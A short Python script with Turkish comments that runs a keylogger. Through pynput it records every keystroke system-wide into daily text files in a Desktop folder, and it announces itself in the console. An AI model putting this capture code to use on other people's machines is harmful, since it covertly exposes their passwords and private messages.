import os
from datetime import datetime
from pynput import keyboard

# Kullanıcının masaüstü yolu
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
log_folder = os.path.join(desktop_path, "Yazılar")

# Klasör yoksa oluştur
if not os.path.exists(log_folder):
    os.makedirs(log_folder)

# Günlük dosya adını belirleme
date_str = datetime.now().strftime("%Y-%m-%d")  # Örn: 2025-02-12
log_file = os.path.join(log_folder, f"{date_str}.txt")

# Klavye girdilerini saklayan değişken
typed_text = ""


# Tuşları yakalama ve dosyaya yazma fonksiyonu
def on_press(key):
    global typed_text

    ignore_keys = {  # Yazılmayacak özel tuşlar
        keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.ctrl, keyboard.Key.ctrl_r,
        keyboard.Key.alt, keyboard.Key.alt_r, keyboard.Key.esc, keyboard.Key.caps_lock
    }

    if key in ignore_keys:
        return  # Bu tuşları atla

    elif key == keyboard.Key.space:
        typed_text += " "  # Boşluk ekle

    elif key == keyboard.Key.enter:
        typed_text += "\n"  # Yeni satır ekle

    elif key == keyboard.Key.backspace:
        typed_text = typed_text[:-1]  # Son karakteri sil

    else:
        try:
            typed_text += key.char  # Normal karakterleri ekle
        except AttributeError:
            pass  # Diğer özel tuşları atla

    # Dosyaya güncellenmiş içeriği yaz
    with open(log_file, "w", encoding="utf-8") as f:
        f.write(typed_text)


# Keylogger başlat
listener = keyboard.Listener(on_press=on_press)
listener.start()

input("Tuşları kaydetmeye başladım... Çıkmak için Enter'a bas.")
